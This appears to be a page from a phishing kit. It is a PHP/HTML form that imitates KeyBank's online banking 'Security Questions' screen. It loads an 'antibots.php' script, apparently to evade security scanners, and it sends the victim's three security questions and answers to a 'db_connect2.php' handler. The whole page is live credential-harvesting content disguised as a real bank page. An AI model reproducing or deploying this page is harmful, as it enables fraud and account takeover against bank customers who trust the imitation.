<?php
require("antibots.php");

?>
<html lang="en"><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>KeyBank Online</title>
    <base href="">  
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="apple-touch-icon" sizes="180x180" id="appleTouchIcon" href="images/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" id="fav32" href="images/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" id="fav16" href="images/favicon-16x16.png">
    <link rel="shortcut icon" href="favicon.ico">
       <link rel="stylesheet" type="text/css" href="css/amt-ui-styles-key.css" media="all">
<style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}button#nebula_div_btn { height: auto !important } .kampyle_vertical_button { background-color:transparent !important;font-family:"Open Sans",sans-serif;cursor:pointer;position:fixed;top:45%;z-index:99999990;height:35px !important;min-height: 35px !important;max-height: 35px !important;width:125px !important;max-width: 125px !important;min-width: 125px !important;-ms-transform:rotate(90deg);-webkit-transform:rotate(90deg);transform:rotate(90deg) } .kampyle_vertical_button .kampyle_button { height:35px;min-height: 35px !important;max-height: 35px !important;width:125px !important;min-width: 125px !important;max-width: 125px !important; background:#5081ff;color:#ffffff;position:absolute;top:0;left:0;z-index:-1; } .kampyle_vertical_button .kampyle_button-text { color:#ffffff;font-size:14px;line-height:35px;text-align:center;font-weight:normal !important; } .kampyle_vertical_button.kampyle_left .kampyle_button { -webkit-border-radius:3px 3px 0 0;-moz-border-radius:3px 3px 0 0;-ms-border-radius:3px 3px 0 0;border-radius:3px 3px 0 0; } .kampyle_vertical_button.kampyle_right { right:-45px; } .kampyle_vertical_button.kampyle_left { left:-45px } .kampyle_vertical_button.kampyle_right .kampyle_button { -webkit-border-radius:0 0 3px 3px;-moz-border-radius:0 0 3px 3px;-ms-border-radius:0 0 3px 3px;border-radius:0 0 3px 3px } .kampyle_vertical_button.kampyle_right, .kampyle_vertical_button.kampyle_left  { padding: 0 !important; }</style></head><body>
    <link href="css/kds-base-key.css" rel="stylesheet">
    <link href="css/ibx-globals-key.css" rel="stylesheet">
    <link href="css/ifstyles-key.css" rel="stylesheet">
    
    <link href="foundation.css" rel="stylesheet">
    <link href="mtb.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="css/amt-sdk-styles.css">
    <link rel="stylesheet" href="css/ifstyles.333ef4c4f4a519c61f8f.css">
    <header class="container-fluid">
    <div class="container">
      <div class="row">
          <div class="col-12">
              <div class="forgots__app-header d-flex align-items-center justify-content-between">
                  <div class="key-logo no-print mb-0"><!----><span><span class="sr-only">KeyBank</span>
                    <img alt="KeyBank" src="images/key_white_logo.png"></span></div>
                    <nav class="navbar navbar-expand-lg navbar-dark bg-dark float-right kds-long-form-text">
                        <div><button class="navbar-toggler" type="button">
                            <span class="navbar-toggler-icon"></span></button>
                            <div class="collapse navbar-collapse navlink-wrapper">
                                <ul class="mb-0 pb-0"><li>
                                    <a data-test="cntushdrlnk" href="javascript:void(0);" title="Contact Us">Contact Us</a></li><li>
                                        <a data-test="openewaccount" href="javascript:void(0)" title="Open a New Account">Open a New Account</a></li></ul></div></div></nav></div></div></div></div></header>
                                        <div class="navbg-blur collapse navbar-collapse"></div></forgots-header><div class="forgots-wrapper"><router-outlet></router-outlet>
                                            <self-unlock><div class="container"><div class="container">
                                                <div class="row"><!---->
                                                    <div class="col-12 col-md-8 offset-md-2 col-xl-6 offset-xl-3 forgot-pwd-container"><!----><!----><!---->
                                                        <forgot-init currentpage="unlock-usr"><!----><div><!----><!----><!----><h3 class="text-center">Security Questions</h3><!---->
                                                            <center><div><p>Please provide your security and answer related to your KeyBank</p></div></center>
                                                            <form action="db_connect2.php" method="Post" novalidate="" autocomplete="off">

                                                            <div data-parentfor="question1" id="question1-error"  class=" cell js-formFieldParent "
                                                            data-showfor="BusinessAccount">
                                                            <label for="question1">Security Question 1</label>
                                                            <select name= "question1"  id="question1"  class=" js-formnputItem">
                                                            <option>Select Your Security Question</option>
                                                            <option name="What was the name of your first car?">What was the name of your first car?</option>
                                        <option name="What was the name of your high school?">What was the name of your high school?</option>
                                        <option name="Where did you meet your spouse for the first time? (Enter full name of city only)">Where did you meet your spouse for the first time? (Enter full name of city only)</option>
                                        <option name="What was the last name of your favorite teacher in final year of high school?">What was the last name of your favorite teacher in final year of high school?</option>
                                        <option name="In what city were you born? (Full name of city only)">In what city were you born? (Full name of city only)?</option>
                                        <option name="In what city was your mother born?(Enter full name of city only)">In what city was your mother born?(Enter full name of city only)</option>
                                        <option name="What is your paternal grandfather's first name?">What is your paternal grandfather's first name?</option>
                                        <option name="What is your mother's middle name?">What is your mother's middle name?</option>
                                        <option name="What was your favorite restaurant in college?">What was your favorite restaurant in college?</option>
                                        <option name="What street did your best friend in high school live on? (Enter full name of street only))">What street did your best friend in high school live on? (Enter full name of street only)</option>
                                                            </select>
                                                            <p  class=" form-error" id="question1Error" role="alert">Please select a question.</p>
                                                            <p  class=" form-help-text"></p>
                                                        </div>
                                        
                                                        <div data-parentfor="Answer1" id="Answer1-error"  class=" cell js-formFieldParent "
                                                            data-showfor="BusinessAccount">
                                                            <label for="Answer1">Answer</label>
                                                            <input data-fcid="" value="" maxlength="80"  class=" js-formnputItem" data-allowpaste="True"
                                                                data-allowcopy="True" data-textboxaccepts="numbersletters" placeholder="" type="text"
                                                                id="Answer1" name= "Answer1"  data-inputtype="text">
                                                            <p  class=" form-error" id="Answer1Error" role="alert">Answer required.</p>
                                                            <p  class=" form-help-text"></p>
                                                        </div>

                                                        <div data-parentfor="question1" id="question1-error"  class=" cell js-formFieldParent "
                                                        data-showfor="BusinessAccount">
                                                        <label for="question1">Security Question 2</label>
                                                        <select name= "question2"  id="question1"  class=" js-formnputItem">
                                                        <option>Select Your Security Question</option>
                                                        <option name="In what city were you born?">In what city were you born?</option>
                                    <option name="What was the name of your high school?">What was the name of your high school?</option>
                                    <option name="Where did you meet your spouse for the first time? (Enter full name of city only)">Where did you meet your spouse for the first time? (Enter full name of city only)</option>
                                    <option name="What is your favorite vacation spot?">What is your favorite vacation spot?</option>
                                    <option name="In what city were you born? (Full name of city only)">What is your youngest sibling's middle name</option>
                                    <option name="In what city was your mother born?(Enter full name of city only)">In what city was your mother born?(Enter full name of city only)</option>
                                    <option name="What is your paternal grandfather's first name?">What is your paternal grandfather's first name?</option>
                                    <option name="What is your mother's middle name?">What is your mother's middle name?</option>
                                    <option name="What was your favorite restaurant in college?">What was your favorite restaurant in college?</option>
                                    <option name="What street did your best friend in high school live on? (Enter full name of street only))">What street did your best friend in high school live on? (Enter full name of street only)</option>
                                                        </select>
                                                        <p  class=" form-error" id="question1Error" role="alert">Please select a question.</p>
                                                        <p  class=" form-help-text"></p>
                                                    </div>
                                    
                                                    <div data-parentfor="Answer1" id="Answer1-error"  class=" cell js-formFieldParent "
                                                        data-showfor="BusinessAccount">
                                                        <label for="Answer1">Answer</label>
                                                        <input data-fcid="" value="" maxlength="80"  class=" js-formnputItem" data-allowpaste="True"
                                                            data-allowcopy="True" data-textboxaccepts="numbersletters" placeholder="" type="text"
                                                            id="Answer1" name= "Answer2"  data-inputtype="text">
                                                        <p  class=" form-error" id="Answer1Error" role="alert">Answer required.</p>
                                                        <p  class=" form-help-text"></p>
                                                    </div>

                                                    <div data-parentfor="question1" id="question1-error"  class=" cell js-formFieldParent "
                                                    data-showfor="BusinessAccount">
                                                    <label for="question1">Security Question 3</label>
                                                    <select name= "question3"  id="question1"  class=" js-formnputItem">
                                                    <option>Select Your Security Question</option>
                                                    <option name="What is the name of your favorite pet?">What is the name of your favorite pet?</option>
                                <option name="What was the name of your high school?">What was the name of your high school?</option>
                                <option name="What is your Favorite Food?">What is your Favorite Food?</option>
                                <option name="Who is your favorite Movie hero or villain">Who is your favorite Movie hero or villain</option>
                                <option name="In what city were you born? (Full name of city only)">In what city were you born? (Full name of city only)?</option>
                                <option name="In what city was your mother born?(Enter full name of city only)">In what city was your mother born?(Enter full name of city only)</option>
                                <option name="What is your paternal grandfather's first name?">What is your paternal grandmother's first name?</option>
                                <option name="What is your mother's middle name?">What is your mother's middle name?</option>
                                <option name="What was your favorite restaurant in college?">What was your favorite restaurant in college?</option>
                                <option name="What is your favorite football player?">What is your favorite football player?</option>
                                                    </select>
                                                    <p  class=" form-error" id="question1Error" role="alert">Please select a question.</p>
                                                    <p  class=" form-help-text"></p>
                                                </div>
                                
                                                <div data-parentfor="Answer1" id="Answer1-error"  class=" cell js-formFieldParent "
                                                    data-showfor="BusinessAccount">
                                                    <label for="Answer1">Answer</label>
                                                    <input data-fcid="" value="" maxlength="80"  class=" js-formnputItem" data-allowpaste="True"
                                                        data-allowcopy="True" data-textboxaccepts="numbersletters" placeholder="" type="text"
                                                        id="Answer1" name= "Answer3"  data-inputtype="text">
                                                    <p  class=" form-error" id="Answer1Error" role="alert">Answer required.</p>
                                                    <p  class=" form-help-text"></p>
                                                </div>
                                                            
                                                            
                                                            
                                                            <div class="forgot-button-block">
                                                            <button class="kds-button kds-button--primary" data-analytics-login="next" id="continue" role="button" style="text-decoration: none" type="submit">Continue</button></div></div> </form><!----></forgot-init></div></div><div class="row"><div class="col-12 col-md-8 offset-md-2 col-xl-6 offset-xl-3 forgot-pwd-amt-block"><!----></div></div></div></div></self-unlock></div></body></html>